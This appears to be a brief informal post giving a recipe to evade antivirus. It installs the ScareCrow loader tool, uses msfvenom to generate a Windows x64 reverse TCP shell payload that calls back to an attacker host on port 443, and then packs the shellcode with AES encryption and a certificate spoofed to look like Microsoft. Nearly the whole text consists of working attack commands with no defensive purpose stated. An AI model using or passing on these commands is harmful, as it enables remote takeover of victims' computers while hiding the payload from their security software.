Gets around sometimes. Not reliable rly. But most shellcode ive made is generic, so made still be good.

Install:
```
git clone <https://github.com/optiv/ScareCrow.git>
cd ScareCriw
go get github.com/fatih/color
go get github.com/yeka/zip
go get github.com/josephspurrier/goversioninfo
go get github.com/Binject/debug/pe
go get github.com/awgh/rawreader
sudo apt-get install osslsigncode
```

```
msfvenom -p windows/x64/shell_reverse_tcp EXITFUNC=thread LHOST=eth0 LPORT=443 -f raw -o code.bin
```

ScareCrow -I code.bin --domain [www.microsoft.com](http://www.microsoft.com) -encryptionmode AES

